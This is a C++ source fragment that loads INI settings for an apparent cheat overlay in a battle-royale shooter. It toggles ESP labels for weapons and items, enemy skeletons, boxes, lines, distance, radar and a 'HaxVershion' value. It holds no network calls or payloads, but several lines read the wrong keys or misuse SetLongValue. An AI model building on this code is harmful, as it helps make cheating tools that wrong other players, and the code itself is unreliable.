	Setting::vahicle_Text_item_ATV2_TextSize = ini.GetLongValue("vahicle_Text_item_ATV2_TextSize", "vahicle_Text_item_ATV2_TextSize", Setting::vahicle_Text_item_ATV2_TextSize);
	Setting::vahicle_Text_item_Tuk_TextSize = ini.GetLongValue("vahicle_Text_item_Tuk_TextSize", "vahicle_Text_item_Tuk_TextSize", Setting::vahicle_Text_item_Tuk_TextSize);



	Setting::Esp_Item_M416_TextSize = ini.GetLongValue("Esp_Item_M416_TextSize", "Esp_Item_M416_TextSize", Setting::Esp_Item_M416_TextSize);
	Setting::Esp_Item_AKM_TextSize = ini.GetLongValue("Esp_Item_AKM_TextSize", "Esp_Item_AKM_TextSize", Setting::Esp_Item_AKM_TextSize);
	Setting::Esp_Item_M762_TextSize = ini.GetLongValue("Esp_Item_M762_TextSize", "Esp_Item_M762_TextSize", Setting::Esp_Item_M762_TextSize);
	Setting::Esp_Item_SCARL_TextSize = ini.GetLongValue("Esp_Item_SCARL_TextSize", "Esp_Item_SCARL_TextSize", Setting::Esp_Item_SCARL_TextSize);
	Setting::Esp_Item_M16A4_TextSize = ini.GetLongValue("Esp_Item_M16A4_TextSize", "Esp_Item_M16A4_TextSize", Setting::Esp_Item_M16A4_TextSize);
	Setting::Esp_Item_G36C_TextSize = ini.GetLongValue("Esp_Item_G36C_TextSize", "Esp_Item_G36C_TextSize", Setting::Esp_Item_G36C_TextSize);
	Setting::Esp_Item_QBZ_TextSize = ini.GetLongValue("Esp_Item_QBZ_TextSize", "Esp_Item_QBZ_TextSize", Setting::Esp_Item_QBZ_TextSize);
	Setting::Esp_Item_Mk47Mutant_TextSize = ini.GetLongValue("Esp_Item_Mk47Mutant_TextSize", "Esp_Item_Mk47Mutant_TextSize", Setting::Esp_Item_Mk47Mutant_TextSize);
	Setting::Esp_Item_FAMAS_TextSize = ini.GetLongValue("Esp_Item_FAMAS_TextSize", "Esp_Item_FAMAS_TextSize", Setting::Esp_Item_FAMAS_TextSize);
	Setting::Esp_Item_M24_TextSize = ini.GetLongValue("Esp_Item_M24_TextSize", "Esp_Item_M24_TextSize", Setting::Esp_Item_M24_TextSize);
	Setting::Esp_Item_Kar98k_TextSize = ini.GetLongValue("Esp_Item_Kar98k_TextSize", "Esp_Item_Kar98k_TextSize", Setting::Esp_Item_Kar98k_TextSize);
	Setting::Esp_Item_Awm_TextSize = ini.GetLongValue("Esp_Item_Awm_TextSize", "Esp_Item_Awm_TextSize", Setting::Esp_Item_Awm_TextSize);
	Setting::Esp_Item_QBU_TextSize = ini.GetLongValue("Esp_Item_QBU_TextSize", "Esp_Item_QBU_TextSize", Setting::Esp_Item_QBU_TextSize);
	Setting::Esp_Item_SLR_TextSize = ini.GetLongValue("Esp_Item_SLR_TextSize", "Esp_Item_SLR_TextSize", Setting::Esp_Item_SLR_TextSize);
	Setting::Esp_Item_SKS_TextSize = ini.GetLongValue("Esp_Item_SKS_TextSize", "Esp_Item_SKS_TextSize", Setting::Esp_Item_SKS_TextSize);
	Setting::Esp_Item_Mk12_TextSize = ini.GetLongValue("Esp_Item_Mk12_TextSize", "Esp_Item_Mk12_TextSize", Setting::Esp_Item_Mk12_TextSize);
	Setting::Esp_Item_Mini14_TextSize = ini.GetLongValue("Esp_Item_Mini14_TextSize", "Esp_Item_Mini14_TextSize", Setting::Esp_Item_Mini14_TextSize);
	Setting::Esp_Item_Mk14_TextSize = ini.GetLongValue("Esp_Item_Mk14_TextSize", "Esp_Item_Mk14_TextSize", Setting::Esp_Item_Mk14_TextSize);
	Setting::Esp_Item_PP19_TextSize = ini.GetLongValue("Esp_Item_PP19_TextSize", "Esp_Item_PP19_TextSize", Setting::Esp_Item_PP19_TextSize);
	Setting::Esp_Item_TommyGun_TextSize = ini.GetLongValue("Esp_Item_TommyGun_TextSize", "Esp_Item_TommyGun_TextSize", Setting::Esp_Item_TommyGun_TextSize);
	Setting::Esp_Item_MP5K_TextSize = ini.GetLongValue("Esp_Item_MP5K_TextSize", "Esp_Item_MP5K_TextSize", Setting::Esp_Item_MP5K_TextSize);
	Setting::Esp_Item_UMP9_TextSize = ini.GetLongValue("Esp_Item_UMP9_TextSize", "Esp_Item_UMP9_TextSize", Setting::Esp_Item_UMP9_TextSize);
	Setting::Esp_Item_Vector_TextSize = ini.GetLongValue("Esp_Item_Vector_TextSize", "Esp_Item_Vector_TextSize", Setting::Esp_Item_Vector_TextSize);
	Setting::Esp_Item_Uzi_TextSize = ini.GetLongValue("Esp_Item_Uzi_TextSize", "Esp_Item_Uzi_TextSize", Setting::Esp_Item_Uzi_TextSize);
	Setting::Esp_Item_S1897_TextSize = ini.GetLongValue("Esp_Item_S1897_TextSize", "Esp_Item_S1897_TextSize", Setting::Esp_Item_S1897_TextSize);
	Setting::Esp_Item_S686_TextSize = ini.GetLongValue("Esp_Item_S686_TextSize", "Esp_Item_S686_TextSize", Setting::Esp_Item_S686_TextSize);
	Setting::Esp_Item_DBS_TextSize = ini.GetLongValue("Esp_Item_DBS_TextSize", "Esp_Item_DBS_TextSize", Setting::Esp_Item_DBS_TextSize);
	Setting::Esp_Item_S12K_TextSize = ini.GetLongValue("Esp_Item_S12K_TextSize", "Esp_Item_S12K_TextSize", Setting::Esp_Item_S12K_TextSize);
	Setting::Esp_Item_M1014_TextSize = ini.GetLongValue("Esp_Item_M1014_TextSize", "Esp_Item_M1014_TextSize", Setting::Esp_Item_M1014_TextSize);
	Setting::Esp_Item_DesertEagle_TextSize = ini.GetLongValue("Esp_Item_DesertEagle_TextSize", "Esp_Item_DesertEagle_TextSize", Setting::Esp_Item_DesertEagle_TextSize);
	Setting::Esp_Item_P1911_TextSize = ini.GetLongValue("Esp_Item_P1911_TextSize", "Esp_Item_P1911_TextSize", Setting::Esp_Item_P1911_TextSize);
	Setting::Esp_Item_R45_TextSize = ini.GetLongValue("Esp_Item_R45_TextSize", "Esp_Item_R45_TextSize", Setting::Esp_Item_R45_TextSize);
	Setting::Esp_Item_P18C_TextSize = ini.GetLongValue("Esp_Item_P18C_TextSize", "Esp_Item_P18C_TextSize", Setting::Esp_Item_P18C_TextSize);
	Setting::Esp_Item_P92_TextSize = ini.GetLongValue("Esp_Item_P92_TextSize", "Esp_Item_P92_TextSize", Setting::Esp_Item_P92_TextSize);
	Setting::Esp_Item_FlareGun_TextSize = ini.GetLongValue("Esp_Item_FlareGun_TextSize", "Esp_Item_FlareGun_TextSize", Setting::Esp_Item_FlareGun_TextSize);
	Setting::Esp_Item_Lazer_TextSize = ini.GetLongValue("Esp_Item_Lazer_TextSize", "Esp_Item_Lazer_TextSize", Setting::Esp_Item_Lazer_TextSize);
	Setting::Esp_Item_Holo_TextSize = ini.GetLongValue("Esp_Item_Holo_TextSize", "Esp_Item_Holo_TextSize", Setting::Esp_Item_Holo_TextSize);
	Setting::Esp_Item_x2_TextSize = ini.GetLongValue("Esp_Item_x2_TextSize ", "Esp_Item_x2_TextSize", Setting::Esp_Item_x2_TextSize);
	Setting::Esp_Item_x3_TextSize = ini.GetLongValue("Esp_Item_x3_TextSize", "Esp_Item_x3_TextSize", Setting::Esp_Item_x3_TextSize);
	Setting::Esp_Item_x4_TextSize = ini.GetLongValue("Esp_Item_x4_TextSize", "Esp_Item_x4_TextSize", Setting::Esp_Item_x4_TextSize);
	Setting::Esp_Item_x6_TextSize = ini.GetLongValue("Esp_Item_x6_TextSize", "Esp_Item_x6_TextSize", Setting::Esp_Item_x6_TextSize);
	Setting::Esp_Item_x8_TextSize = ini.GetLongValue("Esp_Item_x8_TextSize", "Esp_Item_x8_TextSize", Setting::Esp_Item_x8_TextSize);
	Setting::Esp_Item_M249_TextSize = ini.GetLongValue("Esp_Item_M249_TextSize", "Esp_Item_M249_TextSize", Setting::Esp_Item_M249_TextSize);
	Setting::Esp_Item_MG3_TextSize = ini.GetLongValue("Esp_Item_MG3_TextSize", "Esp_Item_MG3_TextSize", Setting::Esp_Item_MG3_TextSize);
	Setting::Esp_Item_DP28_TextSize = ini.GetLongValue("Esp_Item_DP28_TextSize", "Esp_Item_DP28_TextSize", Setting::Esp_Item_DP28_TextSize);
	Setting::Esp_Item_762mm_TextSize = ini.GetLongValue("Esp_Item_762mm_TextSize", "Esp_Item_762mm_TextSize", Setting::Esp_Item_762mm_TextSize);
	Setting::Esp_Item_556mm_TextSize = ini.GetLongValue("Esp_Item_556mm_TextSize", "Esp_Item_556mm_TextSize", Setting::Esp_Item_556mm_TextSize);
	Setting::Esp_Item_9mm_TextSize = ini.GetLongValue("Esp_Item_9mm_TextSize", "Esp_Item_9mm_TextSize", Setting::Esp_Item_9mm_TextSize);
	Setting::Esp_Item_45ACP_Icon = ini.GetLongValue("Esp_Item_45ACP_Icon", "Esp_Item_45ACP_Icon", Setting::Esp_Item_45ACP_Icon);
	Setting::Esp_Item_45ACP_TextSize = ini.GetLongValue("Esp_Item_45ACP_TextSize", "Esp_Item_45ACP_TextSize", Setting::Esp_Item_45ACP_TextSize);
	Setting::Esp_Item_12Guage_TextSize = ini.GetLongValue("Esp_Item_12Guage_TextSize", "Esp_Item_12Guage_TextSize", Setting::Esp_Item_12Guage_TextSize);
	Setting::Esp_Item_Bag1_TextSize = ini.GetLongValue("Esp_Item_Bag1_TextSize", "Esp_Item_Bag1_TextSize", Setting::Esp_Item_Bag1_TextSize);
	Setting::Esp_Item_Bag2_TextSize = ini.GetLongValue("Esp_Item_Bag2_TextSize", "Esp_Item_Bag2_TextSize", Setting::Esp_Item_Bag2_TextSize);
	Setting::Esp_Item_Bag3_TextSize = ini.GetLongValue("Esp_Item_Bag3_TextSize", "Esp_Item_Bag3_TextSize", Setting::Esp_Item_Bag3_TextSize);
	Setting::Esp_Item_Armor1_TextSize = ini.GetLongValue("Esp_Item_Armor1_TextSize", "Esp_Item_Armor1_TextSize", Setting::Esp_Item_Armor1_TextSize);
	Setting::Esp_Item_Armor2_TextSize = ini.GetLongValue("Esp_Item_Armor2_TextSize", "Esp_Item_Armor2_TextSize", Setting::Esp_Item_Armor2_TextSize);
	Setting::Esp_Item_Armor3_TextSize = ini.GetLongValue("Esp_Item_Armor3_TextSize", "Esp_Item_Armor3_TextSize", Setting::Esp_Item_Armor3_TextSize);
	Setting::Esp_Item_Helmet1_TextSize = ini.GetLongValue("Esp_Item_Helmet1_TextSize", "Esp_Item_Helmet1_TextSize", Setting::Esp_Item_Helmet1_TextSize);
	Setting::Esp_Item_Helmet2_TextSize = ini.GetLongValue("Esp_Item_Helmet2_TextSize", "Esp_Item_Helmet2_TextSize", Setting::Esp_Item_Helmet2_TextSize);
	Setting::Esp_Item_Helmet3_TextSize = ini.GetLongValue("Esp_Item_Helmet3_TextSize", "Esp_Item_Helmet3_TextSize", Setting::Esp_Item_Helmet3_TextSize);
	Setting::Esp_Item_Bandage_TextSize = ini.GetLongValue("Esp_Item_Bandage_TextSize", "Esp_Item_Bandage_TextSize", Setting::Esp_Item_Bandage_TextSize);
	Setting::Esp_Item_MedKit_TextSize = ini.GetLongValue("Esp_Item_MedKit_TextSize", "Esp_Item_MedKit_TextSize", Setting::Esp_Item_MedKit_TextSize);
	Setting::Esp_Item_FirstAidKit_TextSize = ini.GetLongValue("Esp_Item_FirstAidKit_TextSize", "Esp_Item_FirstAidKit_TextSize", Setting::Esp_Item_FirstAidKit_TextSize);
	Setting::Esp_Item_Painkiller_TextSize = ini.GetLongValue("Esp_Item_Painkiller_TextSize", "Esp_Item_Painkiller_TextSize", Setting::Esp_Item_Painkiller_TextSize);
	Setting::Esp_Item_EnergyDrink_TextSize = ini.GetLongValue("Esp_Item_EnergyDrink_TextSize", "Esp_Item_EnergyDrink_TextSize", Setting::Esp_Item_EnergyDrink_TextSize);
	Setting::Esp_Item_AdrenalineSyringe_TextSize = ini.GetLongValue("Esp_Item_AdrenalineSyringe_TextSize", "Esp_Item_AdrenalineSyringe_TextSize", Setting::Esp_Item_AdrenalineSyringe_TextSize);
	Setting::Esp_Item_Frag_TextSize = ini.GetLongValue("Esp_Item_Frag_TextSize", "Esp_Item_Frag_TextSize", Setting::Esp_Item_Frag_TextSize);
	Setting::Esp_Item_Smoke_TextSize = ini.GetLongValue("Esp_Item_Smoke_TextSize", "Esp_Item_Smoke_TextSize", Setting::Esp_Item_Smoke_TextSize);
	Setting::Esp_Item_Molotof_TextSize = ini.GetLongValue("Esp_Item_Molotof_TextSize", "Esp_Item_Molotof_TextSize", Setting::Esp_Item_Molotof_TextSize);
	Setting::Esp_Item_Vertical_TextSize = ini.GetLongValue("Esp_Item_Vertical_TextSize", "Esp_Item_Vertical_TextSize", Setting::Esp_Item_Vertical_TextSize);
	Setting::Esp_Item_HalfGrip_TextSize = ini.GetLongValue("Esp_Item_HalfGrip_TextSize", "Esp_Item_HalfGrip_TextSize", Setting::Esp_Item_HalfGrip_TextSize);
	Setting::Esp_Item_Angled_TextSize = ini.GetLongValue("Esp_Item_Angled_TextSize", "Esp_Item_Angled_TextSize", Setting::Esp_Item_Angled_TextSize);
	Setting::Esp_Item_Lasersight_TextSize = ini.GetLongValue("Esp_Item_Lasersight_TextSize", "Esp_Item_Lasersight_TextSize", Setting::Esp_Item_Lasersight_TextSize);
	Setting::Esp_Item_ThumbGrip_TextSize = ini.GetLongValue("Esp_Item_ThumbGrip_TextSize", "Esp_Item_ThumbGrip_TextSize", Setting::Esp_Item_ThumbGrip_TextSize);
	Setting::Esp_Item_Large_FlashHider_TextSize = ini.GetLongValue("Esp_Item_Large_FlashHider_TextSize", "Esp_Item_Large_FlashHider_TextSize", Setting::Esp_Item_Large_FlashHider_TextSize);
	Setting::Esp_Item_Large_Compensator_TextSize = ini.GetLongValue("Esp_Item_Large_Compensator_TextSize", "Esp_Item_Large_Compensator_TextSize", Setting::Esp_Item_Large_Compensator_TextSize);
	Setting::Esp_Item_Large_Suppressor_TextSize = ini.GetLongValue("Esp_Item_Large_Suppressor_TextSize", "Esp_Item_Large_Suppressor_TextSize", Setting::Esp_Item_Large_Suppressor_TextSize);
	Setting::Esp_Item_M416_TextSize = ini.GetLongValue("Esp_Item_Taktik_TextSize", "Esp_Item_Taktik_TextSize", Setting::Esp_Item_Taktik_TextSize);
	Setting::Esp_Item_AR_Quick_TextSize = ini.GetLongValue("Esp_Item_AR_Quick_TextSize", "Esp_Item_AR_Quick_TextSize", Setting::Esp_Item_AR_Quick_TextSize);
	Setting::Esp_Item_AR_Quick_Extended_TextSize = ini.GetLongValue("Esp_Item_AR_Quick_Extended_TextSize", "Esp_Item_AR_Quick_Extended_TextSize", Setting::Esp_Item_AR_Quick_Extended_TextSize);
	Setting::Esp_Item_AR_Extended_TextSize = ini.GetLongValue("Esp_Item_AR_Extended_TextSize", "Esp_Item_AR_Extended_TextSize", Setting::Esp_Item_AR_Extended_TextSize);
	Setting::Esp_Item_Sniper_FlashHider_TextSize = ini.GetLongValue("Esp_Item_Sniper_FlashHider_TextSize", "Esp_Item_Sniper_FlashHider_TextSize", Setting::Esp_Item_Sniper_FlashHider_TextSize);
	Setting::Esp_Item_Sniper_Suppressor_TextSize = ini.GetLongValue("Esp_Item_Sniper_Suppressor_TextSize", "Esp_Item_Sniper_Suppressor_TextSize", Setting::Esp_Item_Sniper_Suppressor_TextSize);
	Setting::Esp_Item_Sniper_Quick_Extended_TextSize = ini.GetLongValue("Esp_Item_Sniper_Quick_Extended_TextSize", "Esp_Item_Sniper_Quick_Extended_TextSize", Setting::Esp_Item_Sniper_Quick_Extended_TextSize);
	Setting::Esp_Item_Sniper_Extended_TextSize = ini.GetLongValue("Esp_Item_Sniper_Extended_TextSize", "Esp_Item_Sniper_Extended_TextSize", Setting::Esp_Item_Sniper_Extended_TextSize);
	Setting::Esp_Item_Sniper_Quick_TextSize = ini.GetLongValue("Esp_Item_Sniper_Quick_TextSize", "Esp_Item_Sniper_Quick_TextSize", Setting::Esp_Item_Sniper_Quick_TextSize);
	Setting::Esp_Item_Mid_FlashHider_TextSize = ini.GetLongValue("Esp_Item_Mid_FlashHider_TextSize", "Esp_Item_Mid_FlashHider_TextSize", Setting::Esp_Item_Mid_FlashHider_TextSize);
	Setting::Esp_Item_Mid_Suppressor_TextSize = ini.GetLongValue("Esp_Item_Mid_Suppressor_TextSize", "Esp_Item_Mid_Suppressor_TextSize", Setting::Esp_Item_Mid_Suppressor_TextSize);
	Setting::Esp_Item_Mid_Compensator_TextSize = ini.GetLongValue("Esp_Item_Mid_Compensator_TextSize", "Esp_Item_Mid_Compensator_TextSize", Setting::Esp_Item_Mid_Compensator_TextSize);
	Setting::Esp_Item_Micro_UZI_TextSize = ini.GetLongValue("Esp_Item_Micro_UZI_TextSize", "Esp_Item_Micro_UZI_TextSize", Setting::Esp_Item_Micro_UZI_TextSize);
	Setting::Esp_Item_SMG_Quick_Extended_TextSize = ini.GetLongValue("Esp_Item_SMG_Quick_Extended_TextSize", "Esp_Item_SMG_Quick_Extended_TextSize   ", Setting::Esp_Item_SMG_Quick_Extended_TextSize);
	Setting::Esp_Item_SMG_Quick_TextSize = ini.GetLongValue("Esp_Item_SMG_Quick_TextSize", "Esp_Item_SMG_Quick_TextSize", Setting::Esp_Item_SMG_Quick_TextSize);
	Setting::Esp_Item_SMG_Extended_TextSize = ini.GetLongValue("Esp_Item_SMG_Extended_TextSize", "Esp_Item_SMG_Extended_TextSize", Setting::Esp_Item_SMG_Extended_TextSize);
	Setting::Esp_Item_DeadBox_TextSize = ini.GetLongValue("Esp_Item_DeadBox_TextSize", "Esp_Item_DeadBox_TextSize", Setting::Esp_Item_DeadBox_TextSize);
	Setting::Esp_Item_AirDrop_TextSize = ini.GetLongValue("Esp_Item_AirDrop_TextSize", "Esp_Item_AirDrop_TextSize", Setting::Esp_Item_AirDrop_TextSize);
	Setting::Esp_Item_GameCoin_TextSize = ini.GetLongValue("Esp_Item_GameCoin_TextSize", "Esp_Item_GameCoin_TextSize", Setting::Esp_Item_GameCoin_TextSize);
	Setting::Esp_Item_Benzin_TextSize = ini.GetLongValue("Esp_Item_Benzin_TextSize", "Esp_Item_Benzin_TextSize", Setting::Esp_Item_Benzin_TextSize);
	Setting::Esp_Item_CrossBow_TextSize = ini.GetLongValue("Esp_Item_CrossBow_TextSize", "Esp_Item_CrossBow_TextSize", Setting::Esp_Item_CrossBow_TextSize);



	Setting::HaxVershion = ini.SetLongValue("HaxVershion", "Value", Setting::HaxVershion);
	Setting::playerBoneColorVer = ini.SetLongValue("playerBoneColorVer", "Value", Setting::playerBoneColorVer);
	Setting::plineColorVer = ini.SetLongValue("plineColorVer", "Value", Setting::plineColorVer);
	Setting::botBoneColorVer = ini.GetLongValue("botBoneColorVer", "Value", Setting::botBoneColorVer);
	Setting::botlineColorVer = ini.GetLongValue("botlineColorVer", "Value", Setting::botlineColorVer);
	skelee = ini.GetLongValue("skelee", "Value", skelee);
	botnsize = ini.GetLongValue("botnsize", "Value", botnsize);
	weapsize = ini.GetLongValue("weapsize", "Value", weapsize);
	pweapsize = ini.GetLongValue("pweapsize", "Value", pweapsize);
	linne = ini.GetLongValue("linne", "Value", linne);
	boxe = ini.GetLongValue("boxe", "Value", boxe);
	boxver1 = ini.GetLongValue("boxver1", "Value", boxver1);
	boxcolorver = ini.GetLongValue("boxcolorver", "Value", boxcolorver);
	TeamIDStyle = ini.GetLongValue("TeamIDStyle", "Value", TeamIDStyle);
	WeaponStyle = ini.GetLongValue("WeaponStyle", "Value", WeaponStyle);
	FlagStyle = ini.GetLongValue("FlagStyle", "Value", FlagStyle);

	bskelee = ini.GetLongValue("bskelee", "Value", bskelee);
	bweapsize = ini.GetLongValue("bweapsize", "Value", bweapsize);
	bweapsize = ini.GetLongValue("bpweapsize", "Value", bweapsize);
	blinne = ini.GetLongValue("blinne", "Value", blinne);
	bboxe = ini.GetLongValue("bboxe", "Value", bboxe);
	bboxver1 = ini.GetLongValue("bboxver1", "Value", bboxver1);
	bTeamIDStyle = ini.GetLongValue("bTeamIDStyle", "Value", bTeamIDStyle);
	bWeaponStyle = ini.GetLongValue("bWeaponStyle", "Value", bWeaponStyle);
	FlagStyle = ini.GetLongValue("FlagStyle", "Value", bFlagStyle);

	skelee = ini.GetLongValue("vehisize", "Value", vehisize);
	TotalEnemyStyle = ini.GetLongValue("TotalEnemyStyle", "Value", TotalEnemyStyle);

	botdissize = ini.GetLongValue("botdissize", "Value", botdissize);
	Setting::gameinfo = ini.GetBoolValue("gameinfo", "gameinfo", Setting::gameinfo);
	Setting::radar = ini.GetBoolValue("radar", "radar", Setting::radar);
	Setting::MAgicline = ini.GetBoolValue("MAgicline", "MAgicline", Setting::MAgicline);
	Setting::pname = ini.GetBoolValue("Enemy Name", "Value", Setting::pname);
	nsize = ini.GetLongValue("Enemy Name size", "Value", nsize);
	nsize = ini.GetLongValue("bot Name size", "Value", botnsize);

	Setting::SkipKnocked = ini.GetBoolValue("SkipKnocked", "Value", Setting::SkipKnocked);
	Setting::playerweapon = ini.GetBoolValue("Enemy Weapon", "Value", Setting::playerweapon);

	pweapone = ini.GetLongValue("Enemy weapon size", "Value", pweapone);

	Setting::pline = ini.GetBoolValue("Enemy Line", "Player", Setting::pline);
	Setting::plinesize = ini.GetLongValue("Line size", "Player", Setting::plinesize);

	Setting::pcorner = ini.GetBoolValue("Player Box", "Player", Setting::pcorner);
	boxe = ini.GetBoolValue("Player Box Mode", "Player", boxe);

	Setting::playerBone = ini.GetBoolValue("Enemy Skeleton", "Player", Setting::playerBone);

	Setting::phealth = ini.GetBoolValue("Enemy Health", "Player", Setting::phealth);

	Setting::plyrdistance = ini.GetBoolValue("Enemy Distance", "Player", Setting::plyrdistance);
	Setting::EspStyle = ini.GetLongValue("Esp", "EspStyle", Setting::EspStyle);
	Setting::BotEspStyle = ini.GetLongValue("Esp", "BotEspStyle", Setting::BotEspStyle);
	dissize = ini.GetLongValue("dissize", "Value", dissize);

	Setting::EnemyLineOfSight = ini.GetBoolValue("EnemyLineOfSight", "Player", Setting::EnemyLineOfSight);
	Setting::MyLineOfSight = ini.GetBoolValue("MyLineOfSight", "Player", Setting::MyLineOfSight);
	Setting::enemyLineofSightSize = ini.GetLongValue("Enemy Distance size", "Player", Setting::enemyLineofSightSize);
	Setting::magicv = ini.GetLongValue("magicv", "Player", Setting::magicv);

	Setting::Vehicle = ini.GetBoolValue("Draw Vehicles", "Player", Setting::Vehicle);

	//////////////////

	Setting::information = ini.GetBoolValue("information", "information", Setting::information);

	Setting::dots = ini.GetBoolValue("Dots", "Dots", Setting::dots);

	Setting::fightmode = ini.GetBoolValue("Fight Mode", "Fight", Setting::fightmode);


	Setting::allitemss = ini.GetBoolValue("All Items", "key0", Setting::allitemss);
	Setting::impitems = ini.GetBoolValue("Important Items", "key0", Setting::impitems);
	////Weapons
	//
	Setting::Esp_Item_M416 = ini.GetBoolValue("M416", "key0", Setting::Esp_Item_M416);
	Setting::Esp_Item_AKM = ini.GetBoolValue("AKM", "key1", Setting::Esp_Item_AKM);
	Setting::Esp_Item_SCARL = ini.GetBoolValue("SCAR-L", "key2", Setting::Esp_Item_SCARL);
	Setting::Esp_Item_M762 = ini.GetBoolValue("M762", "key3", Setting::Esp_Item_M762);
	Setting::Esp_Item_M16A4 = ini.GetBoolValue("M16A4", "key3", Setting::Esp_Item_M16A4);
	Setting::Esp_Item_G36C = ini.GetBoolValue("G36C", "key3", Setting::Esp_Item_G36C);
	Setting::Esp_Item_QBZ = ini.GetBoolValue("QBZ", "key3", Setting::Esp_Item_QBZ);
	Setting::Esp_Item_Mk47Mutant = ini.GetBoolValue("Mk47-Mutant", "key3", Setting::Esp_Item_Mk47Mutant);
	Setting::Esp_Item_AUG = ini.GetBoolValue("AUG", "key3", Setting::Esp_Item_AUG);
	Setting::Esp_Item_Groza = ini.GetBoolValue("Groza", "key3", Setting::Esp_Item_Groza);
	Setting::Esp_Item_FAMAS = ini.GetBoolValue("FAMAS", "key3", Setting::Esp_Item_FAMAS);
	Setting::Esp_Item_AN94 = ini.GetBoolValue("AN94", "key3", Setting::Esp_Item_AN94);
	////Other Weapons
	//
	Setting::Esp_Item_M249 = ini.GetBoolValue("M249", "key3", Setting::Esp_Item_M249);
	Setting::Esp_Item_MG3 = ini.GetBoolValue("MG3", "key3", Setting::Esp_Item_MG3);
	Setting::Esp_Item_DP28 = ini.GetBoolValue("DP28", "key3", Setting::Esp_Item_DP28);
	////Snipers
	//
	Setting::Esp_Item_M24 = ini.GetBoolValue("M24", "key3", Setting::Esp_Item_M24);
	Setting::Esp_Item_Kar98k = ini.GetBoolValue("Kar98k", "key3", Setting::Esp_Item_Kar98k);
	Setting::Esp_Item_Mosin = ini.GetBoolValue("Mosin", "key3", Setting::Esp_Item_Mosin);
	Setting::Esp_Item_Awm = ini.GetBoolValue("AWM", "key3", Setting::Esp_Item_Awm);
	////SniperRifles
	//
	Setting::Esp_Item_QBU = ini.GetBoolValue("QBU", "key0", Setting::Esp_Item_QBU);
	Setting::Esp_Item_SLR = ini.GetBoolValue("SLR", "key1", Setting::Esp_Item_SLR);
	Setting::Esp_Item_SKS = ini.GetBoolValue("SKS", "key2", Setting::Esp_Item_SKS);
	Setting::Esp_Item_Mk12 = ini.GetBoolValue("MK12", "key3", Setting::Esp_Item_Mk12);
	Setting::Esp_Item_Mini14 = ini.GetBoolValue("Mini-14", "key3", Setting::Esp_Item_Mini14);
	Setting::Esp_Item_Mk14 = ini.GetBoolValue("MK14", "key3", Setting::Esp_Item_Mk14);
	Setting::Esp_Item_Win94 = ini.GetBoolValue("Win94", "key3", Setting::Esp_Item_Win94);
	Setting::Esp_Item_VSS = ini.GetBoolValue("VSS", "key3", Setting::Esp_Item_VSS);
	////SMG
	//
	Setting::Esp_Item_PP19 = ini.GetBoolValue("PP19Bizon", "key0", Setting::Esp_Item_PP19);
	Setting::Esp_Item_P90 = ini.GetBoolValue("P90", "key1", Setting::Esp_Item_P90);
	Setting::Esp_Item_TommyGun = ini.GetBoolValue("Tommy Gun", "key2", Setting::Esp_Item_TommyGun);
	Setting::Esp_Item_MP5K = ini.GetBoolValue("MP5K", "key3", Setting::Esp_Item_MP5K);
	Setting::Esp_Item_UMP9 = ini.GetBoolValue("UMP9", "key3", Setting::Esp_Item_UMP9);
	Setting::Esp_Item_Vector = ini.GetBoolValue("Vector", "key3", Setting::Esp_Item_Vector);
	Setting::Esp_Item_Uzi = ini.GetBoolValue("Uzi", "key3", Setting::Esp_Item_Uzi);
	////ShotGuns
	//
	Setting::Esp_Item_SawedOff = ini.GetBoolValue("SawedOff", "key0", Setting::Esp_Item_SawedOff);
	Setting::Esp_Item_S1897 = ini.GetBoolValue("S1897", "key1", Setting::Esp_Item_S1897);
	Setting::Esp_Item_S686 = ini.GetBoolValue("S686", "key2", Setting::Esp_Item_S686);
	Setting::Esp_Item_DBS = ini.GetBoolValue("DBS", "key3", Setting::Esp_Item_DBS);
	Setting::Esp_Item_S12K = ini.GetBoolValue("S12K", "key3", Setting::Esp_Item_S12K);
	Setting::Esp_Item_M1014 = ini.GetBoolValue("M1014", "key3", Setting::Esp_Item_M1014);
	////Pistols
	//
	Setting::Esp_Item_DesertEagle = ini.GetBoolValue("DesertEagle", "key0", Setting::Esp_Item_DesertEagle);
	Setting::Esp_Item_P1911 = ini.GetBoolValue("P1911", "key1", Setting::Esp_Item_P1911);
	Setting::Esp_Item_R45 = ini.GetBoolValue("R45", "key2", Setting::Esp_Item_R45);
	Setting::Esp_Item_P18C = ini.GetBoolValue("P18C", "key3", Setting::Esp_Item_P18C);
	Setting::Esp_Item_P92 = ini.GetBoolValue("P92", "key3", Setting::Esp_Item_P92);
	Setting::Esp_Item_Vz61 = ini.GetBoolValue("Vz61", "key3", Setting::Esp_Item_Vz61);
	Setting::Esp_Item_R1895 = ini.GetBoolValue("R1895", "key3", Setting::Esp_Item_R1895);
	Setting::Esp_Item_FlareGun = ini.GetBoolValue("Flaregun", "key3", Setting::Esp_Item_FlareGun);
	////Scopes
	Setting::scope = ini.GetBoolValue("Scopes", "key0", Setting::scope);
	//
	Setting::Esp_Item_Holo = ini.GetBoolValue("Holo", "key0", Setting::Esp_Item_Holo);
	Setting::Esp_Item_Lazer = ini.GetBoolValue("Lazer", "key1", Setting::Esp_Item_Lazer);
	Setting::Esp_Item_x2 = ini.GetBoolValue("x2", "key2", Setting::Esp_Item_x2);
	Setting::Esp_Item_x3 = ini.GetBoolValue("x3", "key2", Setting::Esp_Item_x3);
	Setting::Esp_Item_x4 = ini.GetBoolValue("x4", "key2", Setting::Esp_Item_x4);
	Setting::Esp_Item_x6 = ini.GetBoolValue("x6", "key2", Setting::Esp_Item_x6);
	Setting::Esp_Item_x8 = ini.GetBoolValue("x8", "key2", Setting::Esp_Item_x8);
	////Ammo
	//
	Setting::Esp_Item_762mm = ini.GetBoolValue("7.62mm", "key0", Setting::Esp_Item_762mm);
	Setting::Esp_Item_556mm = ini.GetBoolValue("5.56mm", "key1", Setting::Esp_Item_556mm);
	Setting::Esp_Item_9mm = ini.GetBoolValue("9mm", "key2", Setting::Esp_Item_9mm);
	Setting::Esp_Item_45ACP = ini.GetBoolValue("45ACP", "key2", Setting::Esp_Item_45ACP);
	Setting::Esp_Item_Awmimo = ini.GetBoolValue("AWM Ammo", "key2", Setting::Esp_Item_Awmimo);
	Setting::Esp_Item_Flare = ini.GetBoolValue("Flare Ammo", "key2", Setting::Esp_Item_Flare);
	Setting::Esp_Item_12Guage = ini.GetBoolValue("12Guage", "key2", Setting::Esp_Item_12Guage);
	Setting::Esp_Item_Ammo_Bolt = ini.GetBoolValue("CrossBow Ammo", "key2", Setting::Esp_Item_Ammo_Bolt);

	///Armors
	//
	Setting::Esp_Item_Bag1 = ini.GetBoolValue("Bag 1", "key0", Setting::Esp_Item_Bag1);
